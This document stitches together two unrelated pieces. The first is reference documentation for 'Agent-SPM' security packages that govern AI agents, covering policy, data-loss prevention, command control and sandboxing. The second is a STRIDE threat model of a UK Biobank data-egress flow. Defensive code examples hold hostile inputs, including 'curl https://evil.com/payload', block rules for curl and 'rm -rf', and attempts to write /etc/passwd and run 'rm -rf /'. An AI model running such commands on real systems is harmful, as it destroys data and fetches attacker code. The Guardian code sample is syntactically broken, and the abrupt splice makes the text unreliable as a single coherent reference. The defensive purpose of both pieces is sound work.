# Package Reference

Comprehensive reference for all Agent-SPM security packages.

---

## Overview

Agent-SPM ships as a monorepo with a core engine and 7 specialized security packages. Each package implements a specific security domain and plugs into the core pipeline.

| Package | npm Scope | Security Domain |
|---------|-----------|-----------------|
| [core](#agent-securitycore) | `@agent-security/core` | Policy engine, plugin pipeline, audit logging |
| [identity](#agent-securityidentity) | `@agent-security/identity` | Agent/tool registration, trust evaluation |
| [egress](#agent-securityegress) | `@agent-security/egress` | Data loss prevention, egress channel control |
| [supply-chain](#agent-securitysupply-chain) | `@agent-security/supply-chain` | MCP scanning, tool provenance, command governance |
| [guardian](#agent-securityguardian) | `@agent-security/guardian` | Anomaly detection, auto-kill, incident response |
| [posture](#agent-securityposture) | `@agent-security/posture` | Inventory, risk scoring, compliance mapping, SIEM |
| [containment](#agent-securitycontainment) | `@agent-security/containment` | Sandbox enforcement, change control |
| [adapters](#agent-securityadapters) | `@agent-security/adapters` | Framework integration (Cursor, Claude Code, LangChain, CrewAI) |

## Dependency Graph

```
@agent-security/adapters ──→ @agent-security/core
@agent-security/identity ──→ @agent-security/core
@agent-security/egress ────→ @agent-security/core
@agent-security/supply-chain → @agent-security/core
@agent-security/guardian ──→ @agent-security/core
@agent-security/posture ───→ @agent-security/core
@agent-security/containment → @agent-security/core
```

All packages depend on `@agent-security/core` for schema types and the `SecurityPlugin` interface. Packages do not depend on each other — they compose at the application level.

---

## @agent-security/core

The policy engine and plugin pipeline. See [architecture](./architecture.md) for the full pipeline design.

**Key exports:**
- `AgentSecurity` — Main platform client
- `SecurityError` — Error thrown when `protect()` blocks execution
- `killSwitch()` — Emergency agent disable plugin
- `rateLimiter()` — Per-agent/per-tool rate limiting plugin
- `sessionContext()` — Cross-call session tracking plugin
- `outputValidator()` — Post-execution output scanning plugin
- `PolicyBundleLoader` — Policy loading and signature verification
- All schema types (see [schemas.md](./schemas.md))

**Pipeline hook:** Orchestrates all phases. See [architecture](./architecture.md#plugin-pipeline).

---

## @agent-security/identity

Agent and tool identity management with trust-based access control.

**Exports:**

| Export | Type | Description |
|--------|------|-------------|
| `AgentRegistry` | Class | Register, lookup, revoke, and query agents |
| `ToolRegistry` | Class | Register, lookup, revoke, and verify tools |
| `TrustEvaluator` | Class | Compute effective trust levels with context |
| `identityEnforcer` | Function | Plugin that enforces identity requirements |

### AgentRegistry

Manages agent identities. Supports registration, lookup, revocation, and queries by type or trust level.

```typescript
import { AgentRegistry } from '@agent-security/identity';

const registry = new AgentRegistry();

registry.register({
  agent_id: 'finance-bot',
  name: 'Finance Bot',
  owner: 'finance-team@acme.com',
  environment: 'prod',
  agent_type: 'workflow_agent',
  trust_level: 'privileged',
  roles: ['finance.reader', 'finance.writer'],
  capabilities: ['tool_call'],
});

const agent = registry.lookup('finance-bot');
const privileged = registry.listByTrustLevel('privileged');

// Revoke a compromised agent
registry.revoke('rogue-bot');
```

**Methods:** `register()`, `lookup()`, `revoke()`, `isRevoked()`, `list()`, `listByType()`, `listByTrustLevel()`, `update()`, `size`, `clear()`

### ToolRegistry

Manages tool identities with SHA-256 manifest verification.

```typescript
import { ToolRegistry } from '@agent-security/identity';

const tools = new ToolRegistry();

tools.register({
  tool_name: 'query_customer_db',
  version: '2.1.0',
  provider: 'built-in',
  verified: true,
  permissions_required: ['db.read'],
});

// Verify tool manifest integrity
const valid = tools.verifyHash('query_customer_db', manifestContent);
```

**Methods:** `register()`, `lookup()`, `revoke()`, `isRevoked()`, `verifyHash()`, `list()`, `listByProvider()`, `listVerified()`, `size`, `clear()`

**Static:** `ToolRegistry.computeHash(manifestContent)` — Compute SHA-256 hash.

### TrustEvaluator

Computes effective trust levels using contextual factors (environment, delegation depth, time of day, consecutive denials).

```typescript
import { TrustEvaluator } from '@agent-security/identity';

const evaluator = new TrustEvaluator();

const result = evaluator.evaluate(agent, {
  environment: 'prod',
  delegation_depth: 2,
  time_of_day: 3,            // 3 AM — suspicious
  consecutive_denials: 5,
});

// result: { effective_trust: 'basic', base_trust: 'privileged', score: 35, adjustments: [...] }
```

**Types:**

```typescript
interface TrustContext {
  environment?: string;
  delegation_depth?: number;
  time_of_day?: number;       // 0-23
  ip_address?: string;
  consecutive_denials?: number;
}

interface TrustResult {
  effective_trust: AgentTrustLevel;
  base_trust: AgentTrustLevel;
  adjustments: Array<{ reason: string; delta: number }>;
  score: number;              // 0-100
}
```

### identityEnforcer

Plugin that enforces agent and tool registration requirements in the `beforeCheck` phase.

```typescript
import { identityEnforcer, AgentRegistry, ToolRegistry, TrustEvaluator } from '@agent-security/identity';

const plugin = identityEnforcer({
  agentRegistry: new AgentRegistry(),
  toolRegistry: new ToolRegistry(),
  trustEvaluator: new TrustEvaluator(),
  requireRegistration: true,        // Deny unregistered agents
  requireToolRegistration: false,   // Don't require tool registration
  minimumTrustLevel: 'basic',       // Minimum trust for any action
  maxDelegationDepth: 3,            // Max delegation chain length
});
```

**Config:** `IdentityEnforcerConfig`

| Option | Type | Default | Description |
|--------|------|---------|-------------|
| `agentRegistry` | `AgentRegistry` | *required* | Agent identity store |
| `toolRegistry` | `ToolRegistry` | — | Tool identity store |
| `trustEvaluator` | `TrustEvaluator` | — | Trust computation engine |
| `requireRegistration` | `boolean` | `true` | Deny unregistered agents |
| `requireToolRegistration` | `boolean` | `false` | Deny unregistered tools |
| `minimumTrustLevel` | `AgentTrustLevel` | — | Minimum trust for any action |
| `maxDelegationDepth` | `number` | — | Max delegation chain length |

---

## @agent-security/egress

Data loss prevention and egress channel enforcement. Classifies data in tool arguments and blocks sensitive data from leaving through unauthorized channels.

**Exports:**

| Export | Type | Description |
|--------|------|-------------|
| `egressEnforcer` | Function | Plugin for egress control |
| `DestinationPolicyEngine` | Class | Evaluate egress policies |
| `ComplianceReporter` | Class | Generate DLP compliance reports |
| `DEFAULT_CLASSIFIERS` | Array | All built-in classifiers |
| `createCustomClassifier` | Function | Create custom data classifiers |

### Built-in Classifiers

| Classifier | Classification | Detects |
|------------|---------------|---------|
| `PII_SSN` | PII | Social Security Numbers |
| `PII_EMAIL` | PII | Email addresses |
| `PII_PHONE` | PII | Phone numbers |
| `PCI_CARD_NUMBER` | PCI | Credit card numbers |
| `SECRET_API_KEY` | SECRET | API keys |
| `SECRET_PRIVATE_KEY` | SECRET | Private keys (RSA, etc.) |
| `SECRET_AWS_KEY` | SECRET | AWS access keys |
| `SECRET_GENERIC` | SECRET | Generic secrets (password=, token=) |

### egressEnforcer

Plugin that scans tool arguments for sensitive data and enforces destination policies.

```typescript
import { egressEnforcer, DEFAULT_CLASSIFIERS } from '@agent-security/egress';

const egress = egressEnforcer({
  policy: {
    rules: [
      { id: 'BLOCK_PII_EMAIL', description: 'No PII via email', classifications: ['PII'], channels: ['email'], action: 'block' },
      { id: 'BLOCK_PCI_ALL', description: 'No PCI data anywhere', classifications: ['PCI'], action: 'block' },
      { id: 'BLOCK_SECRETS', description: 'No secrets anywhere', classifications: ['SECRET'], action: 'block' },
    ],
    default_action: 'allow',
  },
  classifiers: DEFAULT_CLASSIFIERS,
  toolChannelMappings: [
    { tool_name: 'send_email', channel: 'email', destination_field: 'to' },
    { tool_name: 'http_request', channel: 'http_request', destination_field: 'url' },
  ],
  onBlocked: (event) => console.log(`DLP blocked: ${event.classifications.map(c => c.classification)}`),
});

// Access egress log
const log = egress.getEgressLog();
```

**Egress channels:** `http_request`, `file_write`, `db_query`, `email`, `clipboard`, `ci_artifact`, `mcp_response`, `terminal_output`

### ComplianceReporter

Generates DLP compliance reports from egress events.

```typescript
import { ComplianceReporter } from '@agent-security/egress';

const reporter = new ComplianceReporter();
const report = reporter.generateReport(egress.getEgressLog());

// report.evidence.no_pii_egress → true/false
// report.summary.blocked_events → count
```

### Custom Classifiers

```typescript
import { createCustomClassifier } from '@agent-security/egress';

const employeeId = createCustomClassifier(
  'employee_id',
  /EMP-\d{6}/g,
  'Employee ID',
  'PII'
);
```

---

## @agent-security/supply-chain

Tool provenance verification, MCP server security scanning, and command governance.

**Exports:**

| Export | Type | Description |
|--------|------|-------------|
| `McpScanner` | Class | Scan MCP server manifests for risks |
| `ToolProvenance` | Class | Register and verify tool manifest hashes |
| `CommandGovernor` | Class | Control shell command execution |
| `supplyChainGuard` | Function | Plugin combining all supply chain checks |

### McpScanner

Analyzes MCP server manifests for security risks. Produces a risk score (0-100) and recommendation.

```typescript
import { McpScanner } from '@agent-security/supply-chain';

const scanner = new McpScanner();
const report = scanner.scan({
  name: 'external-mcp-server',
  permissions: ['network.outbound', 'fs.write'],
  tools: [{ name: 'exec_command', description: 'Execute shell commands' }],
  verified: false,
});

// report.risk_score → 85
// report.recommendation → 'block'
// report.findings → [{ rule: '...', level: 'critical', message: '...' }]
```

**Risk levels:** `critical`, `high`, `medium`, `low`, `info`

**Recommendations:** `block`, `review`, `allow`

### ToolProvenance

SHA-256 manifest verification for tool integrity.

```typescript
import { ToolProvenance } from '@agent-security/supply-chain';

const provenance = new ToolProvenance();

// Register a known-good manifest
provenance.register('query_customer_db', manifestJson, {
  source: 'internal',
  publisher: 'acme-corp',
});

// Verify at runtime
const check = provenance.verify('query_customer_db', currentManifest);
// check.valid → true/false
// check.reason → 'Hash matches' or 'Hash mismatch: expected abc, got def'
```

### CommandGovernor

Pattern-based control for shell command execution. Prevents dangerous commands from being run by agents.

```typescript
import { CommandGovernor } from '@agent-security/supply-chain';

const governor = new CommandGovernor({
  rules: [
    { pattern: 'npm test', action: 'allow', reason: 'Tests are safe' },
    { pattern: 'npm install *', action: 'require_approval', reason: 'Installs need review' },
    { pattern: 'curl', action: 'block', reason: 'External network calls blocked' },
    { pattern: 'rm -rf *', action: 'block', reason: 'Destructive operations blocked' },
  ],
  default_action: 'block',
});

const result = governor.check('curl https://evil.com/payload');
// result.allowed → false
// result.reason → 'External network calls blocked'
```

### supplyChainGuard

Plugin combining provenance verification, command governance, and MCP blocking.

```typescript
import { supplyChainGuard, ToolProvenance, CommandGovernor } from '@agent-security/supply-chain';

const plugin = supplyChainGuard({
  provenance: new ToolProvenance(),
  commandGovernor: new CommandGovernor({ rules: [...], default_action: 'block' }),
  manifestProvider: (toolName) => manifests.get(toolName),
  blockUnverifiedMcp: true,
});
```

**Config:** `SupplyChainGuardConfig`

| Option | Type | Description |
|--------|------|-------------|
| `provenance` | `ToolProvenance` | Tool manifest verification |
| `commandGovernor` | `CommandGovernor` | Shell command control |
| `manifestProvider` | `(toolName) => string \| undefined` | Provides manifests for runtime verification |
| `blockUnverifiedMcp` | `boolean` | Block unverified MCP tools |

---

## @agent-security/guardian

Autonomous anomaly detection and incident response. Monitors audit events for suspicious patterns and can auto-kill rogue agents.

**Exports:**

| Export | Type | Description |
|--------|------|-------------|
| `GuardianAgent` | Class | Anomaly detection engine |
| `BLUEPRINT_ENGINEERING` | Config | Pre-built config for engineering teams |
| `BLUEPRINT_FINANCE` | Config | Pre-built config for finance (stricter thresholds) |
| `BLUEPRINT_SOC` | Config | Pre-built config for SOC monitoring |

### GuardianAgent

Processes audit events and detects anomalies: frequency spikes, volume spikes, suspicious sequences, and off-hours activity.

> **Production recommendation:** Run the Guardian in a separate Node.js process. This ensures the security observer is outside the agent's blast radius — a compromised agent process cannot tamper with Guardian's enforcement or its event log.

```typescript
// agent-process.ts — your agent (existing process)
import { AgentSecurity } from '@agent-security/core';
import * as process from 'process';

const security = new AgentSecurity({
  policyBundle,
  onAuditEvent: (event) => {
    // Stream audit events to guardian process via IPC
    if (process.send) process.send({ type: 'audit_event', event });
  },
});

// guardian-process.ts — run as a SEPARATE Node.js process
import { GuardianAgent, BLUEPRINT_FINANCE } from '@agent-security/guardian';
import * as process from 'process';

const guardian = new GuardianAgent({
  ...BLUEPRINT_FINANCE,
  auto_kill_threshold: 3,
  onAnomaly: (incident) => alertSecurityTeam(incident),
  onKill: (agentId, reason) => {
    console.error(`[GUARDIAN] Terminated agent: ${agentId} — ${reason}`);
);

// Receive audit events from agent process
process.on('message', (msg: any) => {
  if (msg.type === 'audit_event') {
    guardian.processEvent(msg.event);
  }
});
```

**Anomaly types:**

| Type | Description |
|------|-------------|
| `frequency_spike` | Agent exceeding request frequency threshold |
| `volume_spike` | Agent exceeding data volume threshold |
| `suspicious_sequence` | Agent executing a known-bad tool sequence |
| `off_hours` | Agent active outside allowed hours |
| `auto_kill` | Agent terminated after exceeding anomaly threshold |

**Correction modes:**

| Mode | Behavior |
|------|----------|
| `monitor` | Log incidents only |
| `block` | Log and block the triggering request |
| `correct` | Log, block, and auto-kill the agent |

### Blueprints

Pre-configured `GuardianConfig` objects for common use cases:

- **`BLUEPRINT_ENGINEERING`** — Moderate thresholds, monitor mode
- **`BLUEPRINT_FINANCE`** — Strict thresholds, block mode, off-hours detection
- **`BLUEPRINT_SOC`** — Strictest thresholds, correct mode, auto-kill enabled

---

## @agent-security/posture

Fleet-wide security posture management: inventory, risk scoring, regulatory compliance mapping, and SIEM integration.

**Exports:**

| Export | Type | Description |
|--------|------|-------------|
| `PostureInventory` | Class | Asset inventory (agents, tools, plugins, MCP servers) |
| `RiskScorer` | Class | Risk assessment (0-100 scale) |
| `ComplianceMapper` | Class | EU AI Act and UK AI Governance mapping |
| `SocFormatter` | Class | SIEM event formatting (CEF/LEEF/JSON) |
| `AuditExporter` | Class | Export audit logs (JSON/CSV) |

### PostureInventory

Centralized inventory of all security-relevant assets.

```typescript
import { PostureInventory } from '@agent-security/posture';

const inventory = new PostureInventory();

inventory.registerAgent(agentIdentity);
inventory.registerTool(toolIdentity);
inventory.registerPlugin({ name: 'kill-switch', version: '0.1.0' });
inventory.registerMcpServer('external-server', { url: 'https://...' });

inventory.getSummary(); // { agent: 4, tool: 6, plugin: 3, mcp_server: 1 }
```

### RiskScorer

Scores individual assets and entire fleets on a 0-100 risk scale.

```typescript
import { RiskScorer } from '@agent-security/posture';

const scorer = new RiskScorer();
const fleetScore = scorer.scoreFleet(inventory.getAll());

// fleetScore.overall_score → 42
// fleetScore.level → 'medium'
// fleetScore.top_risks → [{ item_id: 'rogue-bot', score: 85, description: '...' }]
```

**Risk levels:** `critical` (75-100), `high` (50-74), `medium` (25-49), `low` (0-24)

### ComplianceMapper

Maps Agent-SPM capabilities to regulatory frameworks. See [docs/compliance.md](./compliance.md) for full control mappings.

```typescript
import { ComplianceMapper } from '@agent-security/posture';

const mapper = new ComplianceMapper();
const report = mapper.generateReport('eu_ai_act', {
  hasInventory: true,
  hasAuditLog: true,
  hasRiskScoring: true,
  hasDlp: true,
  hasHumanOversight: true,
  hasSupplyChainVerification: true,
  hasGuardian: true,
  hasIdentityManagement: true,
});

// report.summary.compliance_score → 95
// report.controls → [{ control_id: 'EU-AI-001', title: '...', status: 'met' }, ...]
```

**Frameworks:** `eu_ai_act`, `uk_ai_governance`

### SocFormatter

Formats audit events for SIEM ingestion.

```typescript
import { SocFormatter } from '@agent-security/posture';

const formatter = new SocFormatter();

const cef = formatter.toCef(auditEvent);   // CEF format (Splunk, QRadar)
const leef = formatter.toLeef(auditEvent); // LEEF format (QRadar)
const json = formatter.toJson(auditEvent); // Structured JSON (Elastic, Sentinel)

// Timeline view
const timeline = formatter.createTimeline(auditEvents);
```

### AuditExporter

Export audit logs for compliance evidence.

```typescript
import { AuditExporter } from '@agent-security/posture';

const exporter = new AuditExporter();
const jsonExport = exporter.exportJson(auditEvents);
const csvExport = exporter.exportCsv(auditEvents);
```

---

## @agent-security/containment

Sandbox enforcement and change control integration.

**Exports:**

| Export | Type | Description |
|--------|------|-------------|
| `SandboxManager` | Class | Tool execution constraints |
| `ChangeControl` | Class | Ticket validation (Jira, Linear, GitHub) |
| `containmentPlugin` | Function | Plugin bridging sandbox + ticket checks |

### SandboxManager

Defines and enforces execution constraints per tool.

```typescript
import { SandboxManager } from '@agent-security/containment';

const sandbox = new SandboxManager();

sandbox.registerSandbox('terminal', {
  type: 'process',
  allowed_paths: ['/tmp', '/home/app'],
  network_enabled: false,
  timeout_ms: 10000,
  memory_limit_mb: 256,
});

// Check constraints before execution
const check = sandbox.checkConstraints('terminal', { command: 'ls /tmp', url: 'https://evil.com' });
// check.allowed → false
// check.violations → ['Network access not allowed for sandbox "terminal"']
```

**Sandbox types:** `process`, `container`, `wasm`, `none`

### ChangeControl

Validates change tickets against external systems.

```typescript
import { ChangeControl } from '@agent-security/containment';

const changeControl = new ChangeControl({
  provider: 'jira',
  ticket_pattern: '^(JIRA|OPS)-\\d+$',
  required_statuses: ['approved', 'in_progress'],
  validateTicket: async (ticketId) => {
    // Call your ticket system API
    return { ticket_id: ticketId, status: 'approved', approved_by: 'lead' };
  },
});

const ticket = await changeControl.validate('OPS-1234');
```

**Ticket providers:** `jira`, `linear`, `github`, `custom`

### containmentPlugin

Plugin that checks sandbox constraints and ticket requirements in the `beforeCheck` phase.

```typescript
import { containmentPlugin, SandboxManager, ChangeControl } from '@agent-security/containment';

const plugin = containmentPlugin({
  sandboxManager: sandbox,
  changeControl: changeControl,
  ticketRequiredTools: ['deploy_service', 'write_db'],
  onBlocked: (toolName, reason) => alertOps(toolName, reason),
});
```

---

## @agent-security/adapters

Framework adapters for integrating Agent-SPM with popular AI agent frameworks.

**Exports:**

| Export | Type | Description |
|--------|------|-------------|
| `createCursorMiddleware` | Function | Cursor IDE MCP middleware |
| `createClaudeCodeWrapper` | Function | Claude Code tool wrapper |
| `wrapLangChainTool` | Function | LangChain tool decorator |
| `createCrewAIGuard` | Function | CrewAI task guard |

### Cursor MCP Middleware

```typescript
import { createCursorMiddleware } from '@agent-security/adapters';

const middleware = createCursorMiddleware(security, {
  agentId: 'cursor-agent',
  environment: 'dev',
});

// In your MCP server handler
const result = await middleware({
  method: 'tools/call',
  params: { name: 'write_file', arguments: { path: '/etc/passwd' } },
});
// result.allowed → false
```

### Claude Code Wrapper

```typescript
import { createClaudeCodeWrapper } from '@agent-security/adapters';

const guard = createClaudeCodeWrapper(security, {
  agentId: 'claude-code',
  environment: 'dev',
});

const result = await guard({
  tool_name: 'bash',
  tool_input: { command: 'rm -rf /' },
});
// result.allowed → false
```

### LangChain Tool Wrapper

```typescript
import { wrapLangChainTool } from '@agent-security/adapters';

const secureTool = wrapLangChainTool(
  security,
  'query_database',
  async (input: { sql: string }) => db.query(input.sql),
  { agentId: 'langchain-agent', environment: 'prod' },
);
```

### CrewAI Guard

```typescript
import { createCrewAIGuard } from '@agent-security/adapters';

const guard = createCrewAIGuard(security, {
  agentId: 'crew-agent',
  environment: 'prod',
});

const result = await guard({
  task_description: 'Analyze customer data',
  agent_role: 'researcher',
  tool_name: 'query_customer_db',
  tool_args: { query: 'SELECT * FROM customers' },
  crew_id: 'analytics-crew',
});
```

---

## Cross-References

- **Schema definitions** — [docs/schemas.md](./schemas.md)
- **Architecture and pipeline** — [docs/architecture.md](./architecture.md)
- **Policy authoring** — [docs/policies.md](./policies.md)
- **Compliance mapping** — [docs/compliance.md](./compliance.md)
- **Security properties** — [SECURITY.md](../SECURITY.md)


## Executive Brief

*The short version, for leadership.*

**What this assessment is.** A STRIDE threat model of the OCS data-egress flow, end to end as currently documented: a researcher requests an export from UK Biobank RAP, two reviewers approve or deny it, approved output is released for download, and administrators configure the storage locations the flow runs against. The threat model is a requirement setter: it identifies where threats exist and therefore where controls must exist. It does not judge how effective any current or planned control is — that assessment follows in the controls and design-assurance work this document feeds.

**Why it matters.** OCS exists so that no disclosive data leaves UK Biobank's control without approved review. This model examines every point where that promise could be defeated, while the design can still be changed cheaply.

**Areas of greatest concern.**
- Nothing on the egress path inspects the *content* of what is released. Identity, transport, storage and authorisation controls are specified — but none of them looks inside the files. Until the Decision Engine (a separate procurement) is integrated, content checking rests entirely on two human reviewers.
- The file details those reviewers judge — count, sizes, type, description — are produced by the researcher's own export app, and no design document shows OCS re-checking them on arrival.
- The documented release mechanism is a pre-signed URL: a link that works for whoever holds it, which cannot on its own meet the requirement that downloads be tied to the researcher's identity.
- Three administrator paths sit entirely outside the two-person review: Storage Location changes (one write re-points every transfer using that location), documented override authority with no written limits, and changes to the authorisation rules themselves.
- The audit trail may not be able to prove who did what when it matters: some recording is optional by environment, one log store deletes after 90 days, and evidence is spread across four stores with no single authoritative record. Whether this meets the three-year requirement depends on that requirement's scope — an open question for UK Biobank.

**What we need from UK Biobank.** Confirmation of the open questions in Section 7 (several design documents contradict each other, and the contradictions are flagged rather than silently resolved), and four pieces of design information: the IAM/S3/KMS access model, the release-link generation design, the authoritative logging and audit design, and the token/session lifecycle.

## 1. Background and Scope

### 1.1 Background

OCS gives UK Biobank a controlled, auditable way to check and approve data a researcher wants to export from the Research Analysis Platform (RAP), before it is released. The solution is serverless and API-first on AWS (API Gateway, Lambda, Step Functions, DynamoDB, S3, DataSync, EventBridge, KMS), inside a UKB-owned AWS account, and must operate within the Five Safes framework and the agreed security requirements (NFR-SEC-001…014, FR-SEC-001…020).

### 1.2 Scope

**In scope.** The OCS egress flow end to end as currently documented: request creation from RAP, dual review, quarantine and release, the administrative configuration path, and the identity and audit machinery around them. Components whose low-level design is still in progress (Pre-DRTC processing, Post-DRTC processing, network ingress) are in scope at the level the design describes them: their place in the flow and the assets they touch are known, even where their implementation is not.

**Out of scope.** The OCS Decision Engine (FR-SEC-016, FR-SEC-017) is a separate procurement. OCS goes live before it is delivered and integrated; in that interim window its function — automated output classification — is performed manually by the human reviewers, and this model assesses the flow as it will operate in that window. Also out of scope: UK Biobank RAP's internal controls and AMS's internal design.

### 1.3 Audience and intended use

This report is for the OCS delivery and architecture teams (Kainos and UK Biobank) and UK Biobank security stakeholders. It should be used to confirm the open questions in Section 7, and as the threat input to the next artefacts in the security workstream: the controls list (which will prescribe the controls the solution must have, each traceable to a contractual requirement, security best practice, or a threat in this report) and the design assurance review that follows it.

## 2. Architecture Overview

**[Figure 1 — OCS high-level design diagram: insert Rad's HLD here. All data flows and trust boundaries below reference this picture.]**

Component and flow names throughout this report follow Figure 1. Terms are defined in the Glossary (Appendix C).

The egress flow, following one export end to end:

1. A researcher creates an export request from RAP via a DNAnexus applet; files and metadata are sent to the Export API in chunks and stored in an S3 bucket (CD §2; RAP).
2. Files should then pass through Pre-DRTC scanning/validation — design in progress (CD §3).
3. A transfer record is created in DRTC via the API Gateway and backend Lambda (CD §§4–5).
4. Step Functions orchestrates the transfer end to end: it imports the data into the quarantine bucket, polls review status, and exports to the destination once approved (CD §5). Files are therefore staged immutably in quarantine before and during review. In parallel, Post-DRTC processing is triggered — design in progress (CD §8).
5. A Source Data Reviewer approves or denies, against files already staged in quarantine (UF §2).
6. A Destination Data Reviewer approves or denies, the same way (UF §3).
7. Once both approve, the files are copied from quarantine to the destination bucket (CD §§5–6).
8. The researcher downloads the approved output; the documented mechanism is a pre-signed S3 URL (CD §6).

Separately, an administrator can create or edit a Storage Location at any time, setting the source/destination pairing and the reviewer groups for every transfer that uses it (UF §4; API §3). This path is not gated by the two-reviewer control.

Both reviews are metadata-only — location, owner, file count, file size, data classification (UF §§2–3). No design document describes a reviewer opening file content.

*Note on sequencing:* two design documents show a different order from the above — the Multi User Workflow (UF §5) and the Datastores dataflow/retention diagrams (DS §§4–5) place the file copy after both approvals. This model follows the component descriptions (CD §5); the contradiction is carried as an open question (Section 7).

## 3. Key Assets

| Asset | Description | Primary concern |
|---|---|---|
| Research output files | Exported research data awaiting review — expected to carry no participant-level data, but nothing in the flow independently verifies that | Confidentiality |
| Transfer/request metadata | File count, sizes, type, description, classification — the information the two reviewers judge | Integrity, authenticity |
| Quarantine and destination buckets | Where files are staged during review and released from after approval | Confidentiality, integrity |
| Identity tokens (AMS OIDC) | Authentication and role membership for every user action | Confidentiality, authenticity |
| Storage Location configuration | Source/destination pairing and reviewer-group assignment for every transfer using it | Integrity, privilege |
| Audit trail | Who requested, who reviewed, what was decided, when — required immutable for ≥3 years | Integrity, non-repudiation |

## 4. Trust Boundaries

| Ref | Boundary | What changes across it |
|---|---|---|
| TB1 | Internet ↔ RAP export | Researcher-controlled environment → UKB/Kainos-controlled OCS environment |
| TB2 | Pre-DRTC ↔ DRTC | Unreviewed export data → a tracked, reviewable transfer record (the control at this boundary, Pre-DRTC processing, is design-in-progress) |
| TB3 | Reviewer access | UKB reviewer identity and role (AMS + AVP) → permission to approve or deny |
| TB4 | Quarantine zone | Specified as internal-services-only (FR-SEC-007); the datastore design shows a web-UI upload path into the bucket, so this boundary is treated as intended, not established (T17, Section 7) |
| TB5 | Destination ↔ researcher (release) | Approved output → in the researcher's hands; the last control before data leaves UKB's control |
| TB6 | Admin access | UKB admin identity → power to set destinations and reviewer groups for whole classes of transfers, outside the two-reviewer control |

A recurring theme across these boundaries: every specified control governs **who** can act and **how** data moves. None governs **what** the data contains.

## 5. STRIDE Analysis

STRIDE — Spoofing, Tampering, Repudiation, Information disclosure, Denial of service, Elevation of privilege — applied across the components, flows and trust boundaries in Figure 1. Threats are grouped below by primary category; several span more than one category and are counted once. Each threat carries a stable ID and traces to the design document it was found in (source key in Appendix B). Threat T2 (an earlier sequencing concern) was investigated and closed — see Appendix A.

### 5.1 Threat summary

| STRIDE category | Threats (this report) |
|---|---|
| Spoofing | 2 (T7, T20) |
| Tampering | 4 (T5, T11, T17, T18) |
| Repudiation | 3 (T4, T10, T16) |
| Information disclosure | 4 (T1, T3, T8, T14) |
| Denial of service | 1 (T6) |
| Elevation of privilege | 5 (T9, T12, T13, T15, T19) |
| **Total unique threats** | **19** |

### 5.2 Spoofing — the release link and the export app

- (T7) The download link works for anyone who holds it. The documented release mechanism is a pre-signed S3 URL (CD §6) — a bearer credential: if the email is forwarded or a mailbox is compromised, whoever has the link gets the data. The requirement (FR-SEC-012) demands a download tied to the researcher's identity, which a raw pre-signed URL cannot deliver.
- (T20) How the export app proves its identity to the Export API is an open question in its own design document (RAP), so a submission cannot yet be tied with confidence to a named researcher (FR-SEC-014).

**Controls stated in the design documents:** TLS in transit and a time-limited link (T7); token and project validation at the gateway (T20).

### 5.3 Tampering — requester-supplied data and the release trigger

- (T11) The file details both reviewers judge — count, sizes, type, description — are filled in by the researcher's own export app (RAP; UF §§2–3). The review runs on the requester's claims: a faulty or tampered app can state any details it likes.
- (T5) The file fingerprints (checksums) are likewise generated by the researcher's app, and no document shows OCS re-checking them on receipt (RAP; FR-SEC-008).
- (T17) The datastore design shows the web UI uploading files directly into the quarantine bucket (DS §1) — contradicting the requirement that quarantine expose files only to internal services (FR-SEC-007), and opening a user-facing write path into the holding area.
- (T18) The "both approvals" gate is enforced by a resume mechanism — a stored task token restarts the paused workflow and a Lambda starts the file copy (CD §5; HLA). The workflow does not check the approvals itself; anyone with the access to send that resume signal, or start the copy directly, releases files with no approvals at all.

**Controls stated in the design documents:** client-side checksums (T5); none server-side for review metadata (T11); none confirmed for the quarantine upload path (T17); IAM assumed but unverified for the resume path (T18).

### 5.4 Repudiation — attribution and the audit trail

- (T4) It is not confirmed that approve/deny actions are recorded against a named individual's own account rather than a shared or system login (API §4; DS §2; FR-SEC-014).
- (T10) Actions across the flow may be unprovable after the fact. As documented, audit recording is optional in parts of the estate (HLA), one log store retains 90 days (DS §3), and audit evidence sits across four separate stores with no single authoritative record — so who did what, and when, may not be demonstrable when it matters (NFR-SEC-011, FR-SEC-013).
- (T16) Evidence relating to denied transfers may not survive. The documented retention deletes quarantined files after 14 days and keeps nothing for denied transfers (DS §§3, 5) — removing the material a dispute, appeal or investigation would need (FR-SEC-010, FR-SEC-011).

**Controls stated in the design documents:** reviewer decision recorded per transfer (T4); CloudWatch/CloudTrail logging exists but fragmented (T10); Object Lock with a 14-day hold (T16).

### 5.5 Information disclosure — the content gap and external services

- (T1) No automated check inspects file content anywhere before release. The hook built for automated checks publishes events, but nothing is connected to it (CD §7); both reviews are metadata-only (UF §§2–3). Until the Decision Engine is integrated, disclosure prevention rests entirely on two people reading researcher-supplied metadata (FR-SEC-009, NFR-SEC-001).
- (T3) The scanning step meant to check files between RAP export and transfer creation (Pre-DRTC) is design-in-progress (CD §3; FR-SEC-005).
- (T8) Post-DRTC processing — which runs before any review has happened — is also design-in-progress (CD §8).
- (T14) Zendesk, an external ticketing service, receives details of egress requests; what is sent there and who can see it has not been assessed (XHLA; NFR-SEC-012).

**Controls stated in the design documents:** two-person metadata review (T1); none — both processing stages marked "TBD, design in progress" (T3, T8); Zendesk's own access controls, unverified (T14).

### 5.6 Denial of service — exposure of the entry point

- (T6) In the development environment the API is reachable from the internet, limited only by an IP allow-list, bypassing UKB's network protections; the DDoS protection baseline (NFR-SEC-007) is marked "to discuss" in the requirements register and remains undecided (CD §1). The production ingress design has been agreed with UKB and is in progress.

**Controls stated in the design documents:** IP allow-listing (dev), temporary Cognito identity provider, active network ingress design (ticket 29811).

*Availability is deliberately scoped light in this model: confidentiality of research outputs and integrity of the audit trail are the primary assets; egress availability is recoverable. A follow-up pass should cover the wider DoS surface if UKB weighs availability more heavily.*

### 5.7 Elevation of privilege — the paths around the two-person review

- (T9) One admin change to a Storage Location re-points the destination and reviewer groups for every transfer that uses it — and no second person checks the change (UF §4; API §3; NFR-SEC-013, FR-SEC-002).
- (T12) Nothing prevents someone approving their own transfer, or one person giving both approvals: review decisions travel in the request body of `PATCH /transfers/:id`, the only gate is reviewer-group membership, and the identity model allows multiple roles per user (API §§2, 4; FR-SEC-003).
- (T13) Administrators can override a review decision in "exceptional cases" — a documented bypass of the two-person review with no written limits (FR-SEC-018).
- (T15) The token specification defines what a token contains (including expiry) but not how sessions end — refresh, revocation and logout are undefined, so what a stolen or stale token can still do is unknown (OIDC; FR-SEC-001, NFR-SEC-005).
- (T19) The authorisation rules (AVP policies) decide every permission in the system, yet nothing documents who can change them, how changes are reviewed, or how they are logged (UF §4; API §3; CD §10).

